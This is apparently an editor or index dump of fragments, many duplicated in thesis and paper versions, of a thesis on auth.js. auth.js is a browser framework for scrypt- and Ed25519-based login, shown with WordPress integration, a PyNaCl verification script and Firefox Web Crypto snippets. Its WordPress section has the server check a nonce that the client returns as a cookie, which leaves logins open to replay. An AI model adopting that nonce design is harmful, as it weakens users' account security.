	few code modifications. {\tt auth.js} can be used through JavaScript, however,
	all cryptographic primitives are enforced by the browser engine, which we assume
	trusted. For this, we extend Mozilla Crypto with more cryptographic
	primitives, such as {\tt scrypt} and the edwards25519 elliptic curve.
	
	\subsection{Contributions}
	To summarize, this paper contributes:
	
	\begin{itemize}
	
	\item we extend Mozilla Crypto with more cryptographic primitives, such as {\tt
	scrypt} and the edwards25519 elliptic curve --although this is a solely engineering
	task, we consider it important for enabling new cryptographic capabilities for
	web applications;
	
	\item we design and realize {\tt auth.js}, a framework that allows a web
	application to offer advanced authentication that leverages sophisticated
	techniques compared to typical cryptographically hashed text-based passwords;
	
	\item {\tt auth.js} can be easily enabled in all web applications and supports
	traditional passwords -- however, once enabled, switching to a more elaborate
	scheme is straight forward; 
	
	\item we evaluate {\tt auth.js} with real web applications, such as WordPress.
	Enabling \pname{} in WordPress requires
	modifying about 50 LoCs of
	the main authentication code and adding 50 LoCs for
	enabling password recovery and signature validation.
	
	\end{itemize}
fb98d61f9b70a7ee9179318f9c5efae6|file:///home/neo/Documents/diplomatiki/auth.js/background.tex|3|1|V|tex
	In this section, we briefly discuss some common authentication schemes supported by most web applications.
	\pname{} can easily support all mentioned schemes, as well as more elaborate ones, such as PAKE protocols~\cite{pake}.
9236224bcf2d2af66ac17827e22c41bd|file:///home/neo/Documents/thesis/background.tex|27|1|V|tex
	\section{Conventional password authentication}
	The most common authentication scheme used in the web is normal password authentication. 
	
	A general overview of how this scheme works is the following: Firstly, when a user registers a new account, he sends his password over a (usually encrypted) channel to the web server. The web server uses a cryptographic hash function to compute the hash of the user's password and stores the hash, along with other information about the user, such as their username.
	
	When the client wants to authenticate itself to the server, the user is prompted for their password and the password is sent back to the server. At the server, the hash of the password is computed again and compared against the stored hash. If the two hashes match, the authentication is successful and the user is logged in.
	
	\section{Public key authentication}
	An alternative authentication method is public key authentication. 
	
	For this authentication scheme, the client does not send his password to the server it wants to register to. Instead, it generates a key pair consisting of a public key, which gets sent to the server, and a private key, which the client stores locally.
	
	For authentication, the client informs the server that it wants to authenticate. The server then sends a message to the client and the client uses their stored private key to sign the message, in order to prove ownership of the private key. The signed message is sent back to the server, and the server verifies the signature using the stored public key of the user. If the verification is successful, the user is again logged in.
	
	\section{Keybase authentication}
	Keybase \cite{keybase} is a service which offers to its users the ability to prove their identity on social media platforms by mapping their profiles to generated encryption keys. It also offers end-to-end encrypted messaging between its users, an encrypted cloud storage system and other services. Keybase uses a public key authentication system which works as follows. When a new user tries to sign up \cite{keybase-signup}, they firstly type in a password. However, the password does not directly get submitted to the server. Keybase uses its signup API call to generate a random salt value and an {\tt scrypt} hash is generated using the password and the salt. Some bytes of the generated hash value are interpreted as an EdDSA private key, which is then used as a seed to another function to generate the corresponding EdDSA public key. This public key is sent to the Keybase server and is stored as the user's credential. At the login phase \cite{keybase-login}, the EdDSA private key is recomputed similarly to the signup phase. In order to prove ownership of the key, the client recomputes the private key by prompting the user to re-type their password. Using this key, the client creates a signature which is verified by the server using the stored public key of the user.
6b6e077a2de67b7135662a833bb688fc|file:///home/neo/Documents/diplomatiki/auth.js/background.tex|6|1|V|tex
	\subsection{Conventional password authentication}
	The most common authentication scheme used in the web is text-based passwords. 
	A general overview of how this scheme works is the following. Firstly, when a user registers a new account, they send their
	password over a (usually encrypted) channel to the web server. The web server uses a cryptographic hash function to compute the hash of the user's password and stores the hash, along with other information about the user, such as their username.
	
	When the client wants to authenticate itself to the server, the user is prompted for their password and the password is sent back to the server. At the server, the hash of the password is computed again and compared against the stored hash. If the two hashes match, the authentication is successful and the user is logged in.
	For storing different cryptographic digests for identical passwords, the server often concatenates a random, non secret, \emph{salt} to the plain password
	before hashing it.
	
	\subsection{Public key authentication}
	An alternative method is public-key authentication. This form is often combined with keys that are derived from a password, in order to simulate the typical text-based password experience. 
	For this authentication scheme, the client does not send their password to the server that it wants to register to. Instead, it generates a key pair consisting of a public key, which is sent to the server, and a private key, which the client stores locally.
	
	For authentication, the client informs the server that it wants to authenticate. The server then sends a message to the client and the client uses their stored private key to sign the message, in order to prove ownership of the private key. The signed message is sent back to the server, and the server verifies the signature using the stored public key of the user. If the verification is successful, the user is logged in.
	
	\subsection{Keybase authentication}
	Keybase \cite{keybase} is a service which offers to its users the ability to prove their identity on social media platforms by mapping their profiles to generated encryption keys. It also offers end-to-end encrypted messaging between its users, an encrypted cloud storage system and other services. Keybase uses a public key authentication system which works as follows. When a new user tries to sign up \cite{keybase-signup}, they firstly type in a password. However, the password is not directly submitted to the server. Keybase uses its signup API call to generate a random salt value and an {\tt scrypt} hash is generated using the password and the salt. Some bytes of the generated hash value are interpreted as an EdDSA private key, which is then used as a seed to another function to generate the corresponding EdDSA public key. This public key is sent to the Keybase server and is stored as the user's credential. At the login phase \cite{keybase-login}, the EdDSA private key is recomputed similarly to the signup phase. In order to prove ownership of the key, the client recomputes the private key by prompting the user to re-type their password. Using this key, the client creates a signature which is verified by the server using the stored public key of the user.
719095efe33c93549ae3893f1c75bd53|file:///home/neo/Documents/thesis/architecture.tex|1|1|V|tex
	\chapter{Architecture}\label{sec:architecture}
	
	In this section we provide an overview of the architecture of {\tt auth.js}, as
	well as the steps needed to be taken by the web application programmer in order
	to use the framework. We also provide an example of a use case where a server
	chooses to use an advanced authentication scheme based on public-key cryptography, and specifically based on the authentication scheme of Keybase described in Section~\ref{sec:background}, to
	register and authenticate its users. This scheme is referenced as {\tt scrypt\_seed\_ed25519\_keypair} by the {\tt auth.js} API. The cryptographic primitives required to be performed for 
	the authentication and registration are handled on the client side by the {\tt auth.js} framework,
	which uses the client's browser engine to ensure that the cryptographic operations
	are performed in a secure context.
	
	\section{Overview}
	
	{\tt auth.js} provides simple API calls for the programmer that wants to use
	advanced authentication techniques in their web application, without needing to
	worry about the underlying implementation. This is especially important for the
	various cryptographic elements, which may be leveraged during authentication.
	First, the programmer does not need to re-implement any cryptographic
	primitives and, second, all primitives are enforced by the web browser, which
	we consider trusted.
	
	When a client requests a web application, the web server will direct the client to retrieve a copy of {\tt auth.js}.
	The library can be provided to the client either by the web server directly, or via a trusted third party such as a Content Distribution Network.
	After retrieving the library, the client is able to start the registration or authentication process.
	In particular, our library provides two API calls, {\tt authenticate} and {\tt register} that, when called, will use the client's browser Web Crypto API to perform the correct cryptographic operations depending on the chosen authentication scheme.
	For example, in the case of the {\tt scrypt\_seed\_ed25519\_keypair} scheme, the library will use the implemented {\tt scrypt} hash function and the {\tt Ed25519} key generation to create a key pair using the user's password.
	The generated public key will be sent and stored on the server.
	For authentication, it will use the generated private key to sign a nonce sent by the server using the {\tt Ed25519} signature scheme, to prove ownership of the private key.
	An overview of the authentication process with {\tt auth.js} is presented in Figure~\ref{fig:architecture}.
	
	Our library currently supports traditional plain password authentication, as well as the more advanced public key authentication scheme based on the Keybase authentication. It can be extended to support any authentication scheme, as long as the browser supports the corresponding cryptographic primitives.
	
5f09e36a8e6fca7e0e03e02e853a5489|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|1|1|V|tex
	\section{Architecture}\label{sec:architecture}
	
	In this section we provide an overview of the architecture of {\tt auth.js}, as
	well as the steps needed to be taken by the web application programmer in order
	to use the framework. We also provide an example of a use case where a server
	chooses to use an advanced authentication scheme based on public-key cryptography, and specifically based on the authentication scheme of Keybase described in Section~\ref{sec:background}, to
	register and authenticate its users. This scheme is referenced as {\tt scrypt\_seed\_ed25519\_keypair} by the {\tt auth.js} API. The cryptographic primitives required to be performed for
	authentication and registration are handled on the client side by the {\tt auth.js} framework,
	which uses the client's browser engine to ensure that the cryptographic operations
	are performed in a secure context.
	
	\subsection{Overview}
	
	{\tt auth.js} provides simple API calls for the programmer that wants to use
	advanced authentication techniques in their web application, without needing to
	worry about the underlying implementation. This is especially important for the
	various cryptographic elements, which may be leveraged during authentication.
	First, the programmer does not need to re-implement any cryptographic
	primitives and, second, all primitives are enforced by the web browser, which
	we consider trusted.
	
	When a client requests a web application, the web server will direct the client to retrieve a copy of {\tt auth.js}. The library can be provided to the client either by the web server directly, or via a trusted third party such as a Content Distribution Network, as seen in Figure~\ref{fig:architecture}. After retrieving the library, the client is able to start the registration or authentication process. In particular, our library provides two API calls, {\tt authenticate} and {\tt register} that, when called, will use the client's browser Web Crypto API to perform the correct cryptographic operations depending on the chosen authentication scheme. For example, in the case of the {\tt scrypt\_seed\_ed25519\_keypair} scheme, the library will use the implemented {\tt scrypt} hash function and the {\tt Ed25519} key generation to create a key pair using the user's password. For authentication, it will use the generated private key to sign a nonce sent by the server using the {\tt Ed25519} signature scheme, to prove ownership of the private key.
	
	Our library currently supports traditional plain password authentication, as well as the more advanced public key authentication scheme based on the Keybase authentication. It can be extended to support any authentication scheme, as long as the browser supports the corresponding cryptographic primitives.
	
3a64f404ddde24b59ed4061cbb8e913e|file:///home/neo/Documents/thesis/architecture.tex|37|1|V|tex
	\begin{itemize}
	    \item The server that wants to use our library includes {\tt auth.js} in the web application's source.
	    \item The desired authentication options must be initialized by the web programmer using the {\tt initializeCredentialType} API call in the main web application (e.g.\ in the JavaScript file served by the web server), as depicted in Figure~\ref{lst:init_authjs}. This call takes as an argument a JSON object describing the authentication options. The library currently supports two options. First, the {\tt passwordMinLength} option allows the server to choose the minimum password length it can accept. The second option, {\tt passwordProcessMethod}, enforces the use of one of the supported authentication schemes. The currently supported schemes are {\tt plain}, which is the traditional text-based password and {\tt scrypt\_seed\_ed25519\_keypair}. If the {\tt initializeCredentialType} call is not used, the library will use the default values of no minimum password length and the {\tt plain} authentication scheme.  
	    \item After initializing the options, the {\tt authenticate} and {\tt register} calls can be used. Those calls are placed in the web application's JavaScript source by the web programmer, to be called when the user tries to perform a authentication or registration action. The {\tt register} function takes as argument the password which the user typed and returns the corresponding credential based on the chosen authentication scheme, to be sent to the server. The {\tt authenticate} function also takes as argument the user's password and, in the case where an advanced public-key based authentication scheme is used, the optional "message" argument, which is the nonce that should be signed using the user's private key. The function generates the private key based on the password, signs the message, if needed, and returns the signed message. In the case of the plain authentication scheme, the two functions simply return the user's password.
	    \item The web application sends the generated credential to the server. If the authentication or registration is successful, the user can continue using the web application as usual.
	\end{itemize}
	
bc0aedf093e1a4e51d5cde64b65de002|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|37|1|V|tex
	\begin{itemize}
	    \item The server that wants to use our library includes {\tt auth.js} in the web application's source.
	    \item The desired authentication options must be initialized by the web programmer using the {\tt initializeCredentialType} API call in the main web application (e.g.\ in the JavaScript file served by the web server), as depicted in Listing~\ref{lst:init_authjs}. This call takes as an argument a JSON object describing the authentication options. The library currently supports two options. First, the {\tt passwordMinLength} option allows the server to choose the minimum password length it can accept. The second option, {\tt passwordProcessMethod}, enforces the use of one of the supported authentication schemes. The currently supported schemes are {\tt plain}, which is the traditional text-based password and {\tt scrypt\_seed\_ed25519\_keypair}. If the {\tt initializeCredentialType} call is not used, the library will use the default values of no minimum password length and the {\tt plain} authentication scheme.  
	    \item After initializing the options, the {\tt authenticate} and {\tt register} calls can be used. Those calls are placed in the web application's JavaScript source by the web programmer, to be called when the user tries to perform a authentication or registration action. The {\tt register} function takes as an argument the password which the user typed and returns the corresponding credential based on the chosen authentication scheme, to be sent to the server. The {\tt authenticate} function also takes as an argument the user's password and, in the case where an advanced public-key based authentication scheme is used, the optional message argument, which is the nonce that should be signed using the user's private key. The function generates the private key based on the password, signs the message if needed, and returns the signed message. In the case of the plain authentication scheme, the two functions simply return the user's password.
	    \item The web application sends the generated credential to the server. If the authentication or registration is successful, the user can continue using the web application as usual.
	\end{itemize}
	
8827744411a37e2c48ac5ab427d04335|file:///home/neo/Documents/thesis/implementation.tex|90|1|V|tex
	To modify the reset password form, a script that temporarily stops the form submission must be added. We demonstrate how this can be done using JQuery in Figure~\ref{lst:reset_pass}. The minimum password length and authentication scheme must be initialized using the {\tt initializeCredentialType} call. Before eventually submitting the form, the script uses the {\tt auth.js} API to generate the correct credential and change the credential value which will be submitted. Similarly to the reset password form, a script can be added to change the submitted password value on the login form. In the case of the {\tt plain} authentication scheme, the typed password length is checked and the password is submitted as is.
	
	Both the reset password and log in form scripts can be saved in the site's resources in the {\tt wp-includes/js} folder and enqueued in the same way the {\tt auth.js} file is enqueued, by including them in a JavaScript file in the website resources and then using the {\tt login\_enqueue\_scripts} hook in the {\tt wp-login.php} file. 
	
	\subsection{Using {\tt auth.js} with the public key authentication scheme}
	In order to switch to the more advanced public key authentication scheme, the following additional steps must be made, apart from the steps described above:
	    
	\begin{itemize}
	    \item Whenever the {\tt initializeCredentialType} is used to set the options for the credential generation, use {\tt scrypt\_seed\_ed25519\_keypair} as the value for the {\tt passwordProccessMethod} field.
	    \item Modify the login form to include a random token that will be utilized as a nonce and get signed with the user's private key in order to perform authentication. 
	    \item Add the same nonce as a cookie that will be submitted along with the form, in order for the server to have the original value of the nonce and be able to verify the signature. 
	    \item Modify the default authentication check of WordPress to make it verify the submitted signed nonce using the stored public key.
	\end{itemize}
	
	To use the public key authentication scheme in the log in and reset password forms, the {\tt passwordProccessMethod} field seen in Figure~\ref{lst:reset_pass} needs to be changed to {\tt scrypt\_seed\_ed25519\_keypair}. When this authentication scheme is chosen, the {\tt register} API call of {\tt auth.js} will use the browser's Web Crypto API and perform the necessary cryptographic operations to change the value of the typed password to the correspoding Ed25519 public key, which is generated using the {\tt scrypt} hash of the password as a seed. The log in script will use the {\tt authenticate} API call to sign the nonce placed in the login form using the private key correspoding to the public key mentioned earlier. The submitted value will be the public key concatenated with the generated signature. Note that the same nonce is also attached on the login form as a cookie. 
	
79f9df95e93264b33fa7929f6ef41af6|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|88|1|V|tex
	To modify the reset password form, a script that temporarily stops the form submission must be added. We demonstrate how this can be done using JQuery in Listing~\ref{lst:reset_pass}. The minimum password length and authentication scheme must be initialized using the {\tt initializeCredentialType} call. Before eventually submitting the form, the script uses the {\tt auth.js} API to generate the correct credential and change the credential value which will be submitted. Similarly to the reset password form, a script can be added to change the submitted password value on the login form. In the case of the {\tt plain} authentication scheme, the typed password length is checked and the password is submitted as is.
	
	Both the reset password and log in form scripts can be saved in the site's resources in the {\tt wp-includes/js} folder and enqueued in the same way the {\tt auth.js} file is enqueued, by including them in a JavaScript file in the website resources and then using the {\tt login\_enqueue\_scripts} hook in the {\tt wp-login.php} file. 
	
	\subsubsection{Using {\tt auth.js} with the public key authentication scheme}
	In order to switch to the more advanced public key authentication scheme, the following additional steps must be made, apart from the steps described above:
	    
	\begin{itemize}
	    \item Whenever the {\tt initializeCredentialType} is used to set the options for the credential generation, use {\tt scrypt\_seed\_ed25519\_keypair} as the value for the {\tt passwordProccessMethod} field.
	    \item Modify the login form to include a random token that will be utilized as a nonce and get signed with the user's private key in order to perform authentication. 
	    \item Add the same nonce as a cookie that will be submitted along with the form, in order for the server to have the original value of the nonce and be able to verify the signature. 
	    \item Modify the default authentication check of WordPress to make it verify the submitted signed nonce using the stored public key.
	\end{itemize}
	
38babea79b52f2aae714b7195c44f834|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|122|1|V|tex
	To use the public key authentication scheme in the log in and reset password forms, the {\tt passwordProccessMethod} field seen in Listing~\ref{lst:reset_pass} needs to be changed to {\tt scrypt\_seed\_ed25519\_keypair}. When this authentication scheme is chosen, the {\tt register} API call of {\tt auth.js} will use the browser's Web Crypto API and perform the necessary cryptographic operations to change the value of the typed password to the correspoding Ed25519 public key, which is generated using the {\tt scrypt} hash of the password as a seed. The log in script will use the {\tt authenticate} API call to sign the nonce placed in the login form using the private key correspoding to the public key mentioned earlier. The submitted value will be the public key concatenated with the generated signature. Note that the server must have a way to get the original value of the cookie, in order to be able to verify the signature.
e36317066aad5f0e6725097e4f5fe856|file:///home/neo/Documents/thesis/implementation.tex|188|1|V|tex
	The {\tt check\_public\_key} function is added in the {\tt pluggable.php} file. Figure~\ref{lst:check_public_key} shows how {\tt check\_public\_key} verifies that the submitted signature is correct. In particular, it firstly splits the received credentials to get the public key and signature values and checks if the hash of the public key submitted by the user matches the stored public key hash. Then, it uses the submitted signature along with the Ed25519 public key and the original nonce value to verify the signature. We implemented this check as an external Python script, which uses the PyNaCl library to verify that the given signature is correct. Depending on the script's output, the authentication is either successful and the user is logged in, or the user is given a response that the authentication has failed.
d22fa34bc0037b4ea3eed6d15c478208|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|167|1|V|tex
	The {\tt check\_public\_key} function is added in the {\tt pluggable.php} file. Listing~\ref{lst:check_public_key} shows how {\tt check\_public\_key} verifies that the submitted signature is correct. In particular, it parses the received credentials to get the public key and signature values and checks if the hash of the public key submitted by the user matches the stored public key hash. Then, it uses the submitted signature along with the Ed25519 public key and the original nonce value to verify the signature. We implemented this check as an external Python script, which uses the PyNaCl library to verify that the given signature is correct. After the signature is verified, the user is successfully logged in.
449a43084728553285467bddc8696278|file:///home/neo/Documents/diplomatiki/auth.js/evaluation.tex|1|1|V|tex
	\section{Evaluation} \label{sec:evaluation}
	
	In this section we evaluate the performance of {\tt auth.js} and particularly the overhead that the public key authentication system adds over the traditional password authentication method.
	
	\subsection{Setup}
	For the following measurements, we used two Linux machines running Ubuntu 18.04 LTS. The first machine run a dummy server with minimal functionality. The second machine run a fork of Mozilla Firefox Nightly 73.0a1, compiled with the disable optimizations and enable debug options.
	
	\subsection{Average time for posting credentials on the server and getting a reply}
	We measured the average time for generating and posting a user's credentials using the two authentication methods, traditional password authentication and public key authentication, from the machine running Firefox to the machine running the dummy server. For checking the password, the dummy server simply checked if the posted password matched the user's stored password in its database. For checking the posted signature, the server run the Python script mentioned in Section~\ref{sec:implementation}. Table~\ref{tab:post_avg} presents the average time for 1,000 repetitions.
	
	\begin{table}[ht]\label{tab:post_avg}
	\centering
	\caption{Average time for generating key pairs and signatures.}
	\begin{tabular}{@{}|l|l|@{}}
	\hline
	Credential posted & Average time \\ 
	\hline
	\hline
	Password          & 260 ms       \\
	\hline
	Signature         & 328 ms       \\ 
	\hline
	\end{tabular}
	\end{table}
	\subsection{Average time for key pair and signature generation}
	We measured the performance of {\tt auth.js} for creating Ed25519 key pairs and signing messages using the private key of the pair. We split the measurement in 3 parts: the time for only generating key pairs with a given password, the time for only signing a given message with a given key pair, and the time for both generating a key pair using a given password and signing a given message with the generated private key. Table~\ref{tab:generate_avg} presents the average time for these three measurements for 10 thousand repetitions.
	 
	\begin{table}[ht]\label{tab:generate_avg}
	\centering
	\caption{Average time for generating key pairs and signatures.}
	\begin{tabular}[t]{|l|c|} 
	\hline
	&Average time\\
	\hline
	\hline
	Generate key pair                & 30.9 ms \\
	\hline
	Sign message                     & 29.5 ms \\
	\hline
	Generate key pair + sign message & 59.3 ms \\
	\hline
	\end{tabular}
	\end{table}
6aa1349ccc131f04546379e2024030af|file:///home/neo/Documents/thesis/evaluation.tex|1|1|V|tex
	\chapter{Evaluation} \label{sec:evaluation}
	
	In this section we evaluate the performance of {\tt auth.js} and particularly the overhead that the public key authentication system adds over the traditional password authentication method.
	
	\section{Setup}
	For the following measurements, we used two Linux machines running Ubuntu 18.04 LTS. The first machine run a dummy server with minimal functionality. The second machine run a fork of Mozilla Firefox Nightly 73.0a1, compiled with the disable optimizations and enable debug options.
	
	\section{Average time for posting credentials on the server and getting a reply}
	We measured the average time for generating and posting a user's credentials using the two authentication methods, traditional password authentication and public key authentication, from the machine running Firefox to the machine running the dummy server. For checking the password, the dummy server simply check if the posted password matched the user's stored password in its database. For checking the posted signature, the server run the Python script mentioned in Section~\ref{sec:implementation}. Table~\ref{tab:post_avg} presents the average time for 1000 repetitions.
	
	\begin{table}[ht]\label{tab:post_avg}
	\centering
	\caption{Average time for generating key pairs and signatures}
	\begin{tabular}{@{}ll@{}}
	Credential posted & Average time \\ 
	Password          & 260 ms       \\
	Signature         & 328 ms       \\ 
	\end{tabular}
	\end{table}
	
	\section{Average time for key pair and signature generation}
	We measured the performance of {\tt auth.js} for creating Ed25519 key pairs and signing messages using the private key of the pair. We split the measurement in 3 parts: the time for only generating key pairs with a given password, the time for only signing a given message with a given key pair, and the time for both generating a key pair using a given password and signing a given message with the generated private key. Table~\ref{tab:generate_avg} presents the average time for these three measurements for 10 thousand repetitions.
	 
	\begin{table}[ht]\label{tab:generate_avg}
	\centering
	\caption{Average time for generating key pairs and signatures}
	\begin{tabular}[t]{lc} 
	&Average time\\
	Generate key pair                & 30.9 ms \\
	Sign message                     & 29.5 ms \\
	Generate key pair + sign message & 59.3 ms
	\end{tabular}
	\end{table}
	
114ad76dbf6778f0f0b2bc86f261f366|file:///home/neo/Documents/thesis/related-work.tex|1|1|V|tex
	\chapter{Related Work}\label{sec:related}
	
	\section{Advanced authentication schemes}
	Apart from the public key authentication scheme we presented, various more authentication methods exist. PAKE protocols such as SRP~\cite{srp} allow clients to authenticate themselves to a server and exchange a secret securely, without needing to send their actual password. Even though certain PAKE protocols have seen some adoption, many of them have not been successfully deployed yet. Other password-based authentication mechanisms which are based on PAKE protocols, such as \cite{strong-authentication}, are also starting to get proposed. {\tt auth.js} can serve as a single framework from which such protocols can be deployed. As long as the cryptographic primitives needed for a protocol are implemented in the client's browser, {\tt auth.js} can securely enforce their usage, assuming of course that the browser is not compromised. A web programmer who wishes to use another scheme for authenticating users can do so simply by changing the {\tt passwordProccessMethod} field in their forms to the authentication scheme of their choosing and transparently switch to a new authentication method, assuming that the server also supports the use of a chosen protocol. 
	The autentication scheme mentioned in this thesis is based on the authentication scheme used by Keybase \cite{keybase}. The major difference is that Keybase uses its own source code to perform the cryptographic operations, while {\tt auth.js} uses the cryptographic primitives that are built in the user's browser, ensuring that the operations will be performed securely.
	
	\section{Cryptographic primitives}
	In the recent years, many improvements have been made and many new cryptographic primitives have been introduced, which are not yet implemented by the major web browsers. For our work, we added the scrypt \cite{scrypt_hash} hash function as well as the Curve25519 elliptic curve \cite{ed25519} to Mozilla Firefox and specifically in the Web Crypto API, in order to use them for our authentication scheme. We expect that those cryptographic primitives, as well as more primitives such as the bcrypt \cite{bcrypt}, Argon2 \cite{argon2} and blake2 \cite{blake2} hash functions or new elliptic curves such as the FourQ curve \cite{fourq} will eventually be implemented in the major web browsers and will be available to use. As more and more cryptographic primitives are added, {\tt auth.js} can be modified to support the usage of these primitives to create new authentication schemes. Other projects have also explored the extension of the Web Crypto API functionality to add support for other operations, such as document signing \cite{webcrypto_signing}. New types of cryptographic primitives are also starting to get implemented. For example, Microsoft's SEAL \cite{sealcrypto} provides an API that can be used to perform homomorphic encryption.
	
	\section{Cryptography frameworks}
	Other frameworks have also tried making advanced cryptography more accessible and easier to use. For example, Let's Encrypt \cite{letsencrypt-https}, \cite{letsencrypt2} makes it easy to obtain a TLS certificate without the need of human intervention. Keybase is another web service that offers advanced cryptography to simple users, such as an advanced authentication scheme, end-to-end encryption, public identity verification and encrypted storage.
cc173d5fbd371e9ecceebfedd07fcc4a|file:///home/neo/Documents/diplomatiki/auth.js/conclusion.tex|4|1|V|tex
	In this paper we designed, implemented and evaluated \pname{}, a framework that
291e662eaf44eed626a48382a91a55e5|file:///home/neo/Documents/diplomatiki/auth.js/conclusion.tex|4|1|V|tex
	In this paper we designed, implemented and evaluated \pname{}, a framework that
	allows web developers to integrate any authentication scheme in their
	applications. \pname{} allows a developer to express the authentication policy
	in JavaScript and realize complex schemes, that leverage modern cryptographic
	primitives, in the browser environment. Moreover, the framework makes sure that
	cryptographic operations are not implemented in JavaScript, but are instead carried out
	using the browser's internal engine, which is considered trusted.
	For this, we extended Mozilla Crypto with the {\tt
	scrypt} hash function and the edwards25519 elliptic curve in order to easily
	implement the authentication used in Keybase. In the same fashion, \pname{} can
	support other cryptographic-based authentication schemes, such as PAKE.
	Enabling \pname{} in existing web application is trivial and, once the
	framework is in place, switching from one authentication to another is straight
	forward.  For demonstrating this, we enabled \pname{} in a popular open-source
	web application, namely WordPress. Our modifications do not exceed 50 LoCs for
	the main authentication code in WordPress and require additionally 50 LoCs for
	enabling password recovery and signature validation.
	
	
	
b16e1b5d55c882f3939738e7b45b7829|file:///home/neo/Documents/thesis/appendixes.tex|1|20|v|tex
	Appendix A
2ea58a67a9e557a25d8f477668cd768b|file:///home/neo/Documents/thesis/architecture.tex|22|1126|v|tex
	app:appenixA
e68fd9062a3a666224bc9dc25c42f957|file:///home/neo/Documents/thesis/appendices.tex|1|29|v|tex
	appendixA
b50da436692d0efad5c011f0a4146a21|file:///home/neo/Documents/thesis/appendices.tex|1|1|V|tex
	\appendix \chapter{} \label{app:appenixA}
3ca0fdfd73f3b0877a25150ef565c04a|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/verify.py|16|1|V|python
	SIGNATURE = bytearray.fromhex(SIGNATURE_STR)
	MESSAGE = bytearray.fromhex(MESSAGE_STR)
	
	# Create a VerifyKey object from a hex serialized public key
	VERIFY_KEY = nacl.signing.VerifyKey(PUBLIC_KEY_STR, encoder=nacl.encoding.HexEncoder)
	
	# Check the validity of a message's signature
	try:
	    VERIFIED = VERIFY_KEY.verify(MESSAGE_STR, SIGNATURE_STR, encoder=nacl.encoding.HexEncoder)
	    print("1")
	    # print ("".join("{:02x}".format(ord(c)) for c in verified))
	except nacl.exceptions.BadSignatureError:
	    print("0")
829cfacf41fa674c35c8d2dcafda68ef|file:///home/neo/Documents/thesis/appendices.tex|2|1|V|tex
	\begin{figure}[h]
	    \caption{JavaScript implementation of the authenticate API call} 
	    \label{lst:authenticate_impl}
3412011c8156c102fc0a359d892ff851|file:///home/neo/Documents/thesis/appendices.tex|2|1|V|tex
	\begin{figure}[h]
	    \caption{JavaScript implementation of the authenticate API call} 
	    \label{lst:authenticate_impl}
	\begin{lstlisting}[]
686155af75a60a0f6e9d80c1f7edd3e9|file:///home/neo/Documents/thesis/appendices.tex|59|14|v|tex
	JavaScript
653a1f19913bc344510ddbda3fc3729a|file:///home/neo/Documents/thesis/appendices.tex|59|14|v|tex
	P implementation of the authenticate API call
fde37af89fa4f8805a6dfde60ef8ff43|file:///home/neo/Documents/thesis/appendices.tex|60|16|v|tex
	authenticate_impl
335ce7eda11afcedc45913db801b43c6|file:///home/neo/Documents/thesis/appendices.tex|56|1|V|tex
	\appendix \chapter{} \label{app:appenixB}
	\begin{figure}[h]
	    \caption{Python script which checks the validity of the signature} 
	    \label{lst:verify_sig}
	\begin{lstlisting}[]
b35fdaa9a8737665bbba1b96093c916c|file:///home/neo/Documents/thesis/appendices.tex|78|14|v|tex
	Python script which checks the validity of the signature
24eff2da9cf45b386ad9b6ce9389bba9|file:///home/neo/Documents/thesis/appendices.tex|79|12|v|tex
	lst:verify_sig
feb5e08c90a330c2aaa85edfcd3c9909|file:///home/neo/Documents/thesis/appendices.tex|56|1|v|tex
	\appendix 
ae1a8872082283125b39cf3f66c618a0|file:///media/neo/Storage/mozilla-central/dom/crypto/WebCryptoTask.cpp|3074|1|V|cpp
	            if (algName.EqualsLiteral(WEBCRYPTO_ALG_SHA1) ||
	                algName.EqualsLiteral(WEBCRYPTO_ALG_SHA256) ||
	                algName.EqualsLiteral(WEBCRYPTO_ALG_SHA384) ||
	                algName.EqualsLiteral(WEBCRYPTO_ALG_SCRYPT) ||
	                algName.EqualsLiteral(WEBCRYPTO_ALG_CURVE25519) ||
	                algName.EqualsLiteral(WEBCRYPTO_ALG_ED25519SIGN) ||
	                algName.EqualsLiteral(WEBCRYPTO_ALG_SHA512)) {
	                return new DigestTask(aCx, aAlgorithm, aData);
	            }
	
	            return new FailureTask(NS_ERROR_DOM_NOT_SUPPORTED_ERR);
	        }
f582abdff070583a6961e9b4a8beb108|file:///home/neo/Documents/thesis/appendices.tex|87|5|V|tex
	        algName.EqualsLiteral(WEBCRYPTO_ALG_ED25519SIGN) ||
	        algName.EqualsLiteral(WEBCRYPTO_ALG_SHA512)) {
53dd86752cae0b86fb22f8af68282a7e|file:///home/neo/Documents/thesis/appendices.tex|82|1|V|tex
	    ...
	    if (algName.EqualsLiteral(WEBCRYPTO_ALG_SHA1) ||
	        algName.EqualsLiteral(WEBCRYPTO_ALG_SHA256) ||
	        algName.EqualsLiteral(WEBCRYPTO_ALG_SHA384) ||
	        algName.EqualsLiteral(WEBCRYPTO_ALG_SCRYPT) ||
	        algName.EqualsLiteral(WEBCRYPTO_ALG_CURVE25519) ||
	        ...
	        return new DigestTask(aCx, aAlgorithm, aData);
	    }
	    return new FailureTask(NS_ERROR_DOM_NOT_SUPPORTED_ERR);
9fcab31526dec8bd4aced33a85ec6e7f|file:///home/neo/Documents/thesis/appendices.tex|86|5|V|tex
	    algName.EqualsLiteral(WEBCRYPTO_ALG_CURVE25519) ||
9314a2fc385b2f31659fd430ba37650b|file:///home/neo/Documents/thesis/appendices.tex|77|1|V|tex
	\begin{figure}[h]
	    \caption{Adding scrypt to the supported hash functions of the WebCryptoAPI} 
	    \label{lst:support_scrypt}
	\begin{lstlisting}[]
	...
	if (algName.EqualsLiteral(WEBCRYPTO_ALG_SHA1) ||
	    algName.EqualsLiteral(WEBCRYPTO_ALG_SHA256) ||
	    algName.EqualsLiteral(WEBCRYPTO_ALG_SHA384) ||
	    algName.EqualsLiteral(WEBCRYPTO_ALG_SCRYPT) ||
	    ...
	    return new DigestTask(aCx, aAlgorithm, aData);
	}
	return new FailureTask(NS_ERROR_DOM_NOT_SUPPORTED_ERR);
	\end{lstlisting}
	\end{figure}
a601fcb1b9f549aa24e71191e910327e|file:///home/neo/Documents/thesis/appendices.tex|94|14|v|tex
	Adding scrypt to the supported hash functions of the WebCryptoAPI
323cc4f2c49d6aeb934a5c1e592e65d8|file:///home/neo/Documents/thesis/appendices.tex|95|12|v|tex
	lst:support_scrypt
9a74e8ff7b26a35250e560358e2b9bea|file:///home/neo/Documents/thesis/appendices.tex|97|1|V|tex
	...
